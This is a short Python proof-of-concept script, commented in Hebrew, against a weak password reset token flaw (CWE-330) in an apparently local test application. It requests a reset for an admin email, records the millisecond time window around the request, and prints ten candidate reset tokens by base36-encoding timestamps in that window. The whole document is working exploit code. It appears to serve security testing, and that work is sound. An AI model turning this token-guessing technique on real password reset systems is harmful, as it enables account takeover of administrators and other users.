## Weak/Predictable Password Reset Token (CWE-330)
import requests
import time

URL = "http://localhost:3001/api/auth/reset-request"
PAYLOAD = {"email": "admin@hemi-emperium.local"}

def base36encode(number):
    alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'
    base36 = ''
    while number:
        number, i = divmod(number, 36)
        base36 = alphabet[i] + base36
    return base36 or alphabet[0]

# מדידת זמן התחלה באלפיות שנייה
start_time = int(time.time() * 1000)

# שליחת בקשה אחת כדי לצמצם את חלון הזמן
try:
    requests.post(URL, json=PAYLOAD, timeout=2)
except Exception as e:
    print(f"שגיאה בשליחה: {e}")

# מדידת זמן סיום
end_time = int(time.time() * 1000)

window = end_time - start_time

print(f"זמן התחלה: {start_time}")
print(f"זמן סיום: {end_time}")
print(f"חלון זמן: {window} אלפיות שנייה\n")

print("10 טוקנים פוטנציאליים לניסוי:")

# מניעת חלוקה באפס אם השרת הגיב מהר מדי
if window < 10:
    step = 1
else:
    step = window // 10

for i in range(10):
    ts = start_time + (i * step)
    print(f"{i+1}. {base36encode(ts)}")